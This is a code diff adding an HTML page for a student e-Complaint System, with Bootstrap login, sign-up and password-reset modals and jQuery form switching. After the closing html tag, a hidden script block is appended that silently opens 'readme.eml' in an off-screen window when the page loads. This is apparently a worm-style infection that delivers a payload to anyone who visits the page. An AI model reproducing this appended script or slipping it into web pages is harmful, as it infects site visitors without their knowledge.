@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>eCS</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="resource/bootstrap.min.css">
+  <script src="resource/jquery.min.js"></script>
+  <script src="resource/bootstrap.min.js"></script>
+  <script type="text/javascript" src="resource/jquery-1.11.0.min.js"></script>
+<script type="text/javascript" src="resource/jquery.leanModal.min.js"></script>
+<link rel="stylesheet" href="resource/font-awesome.min.css" />
+<link type="text/css" rel="stylesheet" href="resource/login_style.css" />
+  <style>
+    input[type=text], select {
+    width: 100%;
+    padding: 12px 20px;
+    margin: 8px 0;
+    display: inline-block;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    box-sizing: border-box;
+}
+    .row.content {height: 1500px}
+    li
+    {
+    	height:60px;
+    	font-size:17px;
+    }
+   
+    .sidenav {
+      background-color: #f1f1f1;
+      height: 100%;
+    }
+    
+
+    footer {
+      background-color: #555;
+      color: white;
+      padding: 15px;
+    }
+    
+ 
+    @media screen and (max-width: 767px) {
+      .sidenav {
+        height: auto;
+        padding: 15px;
+      }
+      .row.content {height: auto;} 
+    }
+  </style>
+</head>
+<body>
+<nav class="navbar navbar-inverse" style="background-color:rgb(0, 132, 191);height:65px" >
+  <div class="container-fluid">
+    <div class="navbar-header" >
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>                        
+      </button>
+      <a class="navbar-brand" href="hub.rgukt.ac.in" style="color:white;font-size:22px;">e-Complaint System</a>
+    </div>
+    <div class="collapse navbar-collapse" id="myNavbar">
+    
+      <ul class="nav navbar-nav navbar-right">
+        <li><a id="modal_trigger" href="#modal" style="color:white"> Login<span class="caret"></span></a></li>
+      </ul>
+    </div>
+ 	<div id="modal" class="popupContainer" style="display:none;">
+		<header class="popupHeader">
+			<span class="header_title" >Login</span>
+			<span class="modal_close"><i class="fa fa-times"></i></span>
+		</header>
+		
+		<section class="popupBody">
+			<div class="social_login">
+
+				<div class="centeredText">
+					<span><strong>If you are a new user press on sign up to register</strong></span>
+				</div>
+
+				<div class="action_btns" >
+					<div class="one_half"><a href="#" id="login_form" class="btn btn_lblue">Login</a></div>
+					<div class="one_half " style="padding-left:10px;"><a href="#" id="register_form" class="btn btn_lblue">Sign up</a></div>
+		
+				</div>
+			</div>
+
+			<!-- Username & Password Login form -->
+			<div class="user_login">
+				<form>
+					<label>Id / Username</label>
+					<input type="text" />
+					<br />
+					<label>Password</label>
+					<input type="password" />
+					<br />
+					<div class="action_btns">
+						<div class="one_half"><a href="#" class="btn back_btn btn_lblue"><i class="fa fa-angle-double-left"></i> Back</a></div>
+						<div class="one_half last"><a href="#" class="btn btn_lblue">Login</a></div>
+					</div>
+				</form>
+				<br>
+			<div class="one_half"><a href="#" id="forgot_form" class="btn btn_lblue1">Forgot password?</a></div>
+			<br><br><br>
+			</div>
+
+			<!-- Register Form -->
+			<div class="user_register">
+				<form>
+					<label name="name">Id</label>
+					<input type="text" id="idtext"/>
+					<label name="name" for="sel1">Branch:</label>
+					      <select class="form-control" id="sel1" style="width:30%">
+						<option>CSE</option>
+						<option>ECE</option>
+						<option>CIVIL</option>
+						<option>MECH</option>
+						<option>MME</option>
+						<option>CHEM</option>
+						<option>EEE</option>
+						<option>P1</option>
+						<option>P2</option>
+					      </select>
+					<label name="name">Full Name</label>
+					<input type="text" />
+					<br />
+					<label name="email">Email Address</label>
+					<input type="email" />
+					<br />
+					<label name="pswd">Password</label>
+					<input type="password" />
+					<br />
+					<div class="action_btns">
+						<div class="one_half"><a href="#" class="btn back_btn btn_lblue"><i class="fa fa-angle-double-left"></i> Back</a></div>
+						<div class="one_half last"><a href="#" class="btn btn_lblue">Register</a></div>
+					</div>
+				</form>
+			</div>
+				<!-- forgot for-->
+			<div class="forgot_for">
+				<form>
+					<label>Email Address</label>
+					<input type="email" />
+					<br /><br />
+					<div class="action_btns">
+						<div class="one_half"><a href="#" class="btn back_btn btn_lblue"><i class="fa fa-angle-double-left"></i> Back</a></div>
+						
+						<div class="one_half last"><a href="#" class="btn btn_lblue">Send Password</a></div>
+					</div>
+				</form>
+			</div>
+		</section>
+	</div>
+</div>
+</nav>
+<div class="container-fluid">
+  <div class="row content" style="margin:-15px -10px;">
+    <div class="col-sm-3 sidenav" style="margin:-5px -5px;width:300px;">
+	<br>
+      <ul class="nav nav-pills nav-stacked" >
+        <li class="active"><a href="#section1">Home</a></li>
+        <li><a href="profile.html">Profile</a></li>
+        <li><a href="#myModal"  data-toggle="modal" data-target="#myModal">Complaint Section</a></li>
+        <li><a href="feedback.html">Feedback</a></li>
+        <li><a href="myproblems.html">MyComplaints</a></li>
+      </ul>
+      
+      <div class="input-group">
+        <input type="text" class="form-control" placeholder="Search Blog..">
+        <span class="input-group-btn">
+          <button class="btn btn-default" type="button">
+            <span class="glyphicon glyphicon-search"></span>
+          </button>
+        </span>
+      </div>
+    </div>
+      <div class="modal fade" id="myModal" role="dialog">
+    <div class="modal-dialog">
+    
+      <!-- Modal content-->
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="close" data-dismiss="modal">&times;</button>
+          <h4 class="modal-title" style="text-align:center;">Department</h4>
+        </div>
+        <div class="modal-body">
+          <p>Some text in the modal.</p>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+        </div>
+      </div>
+      
+    </div>
+  </div>
+
+   
+<script type="text/javascript">
+	$("#modal_trigger").leanModal({top : 200, overlay : 0.6, closeButton: ".modal_close" });
+
+	$(function(){
+		// Calling Login Form
+		$("#login_form").click(function(){
+			$(".social_login").hide();
+			$(".forgot_form").hide();
+			$(".user_login").show();
+			return false;
+		});
+
+		// Calling Register Form
+		$("#register_form").click(function(){
+			$(".social_login").hide();
+			$(".user_register").show();
+			$(".header_title").text('Register');
+			return false;
+		});
+
+		// Going back to Social Forms
+		$(".back_btn").click(function(){
+			$(".user_login").hide();
+			$(".user_register").hide();
+			$(".forgot_for").hide();
+			$(".social_login").show();
+			$(".header_title").text('Login');
+			return false;
+		});
+		
+		$("#forgot_form").click(function(){
+			$(".user_login").hide();
+			$(".user_register").hide();
+			$(".forgot_for").show();
+			$(".header_title").text('Login');
+			return false;
+		});
+
+
+	})
+</script>
+</body>
+</html>
+
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html>\00
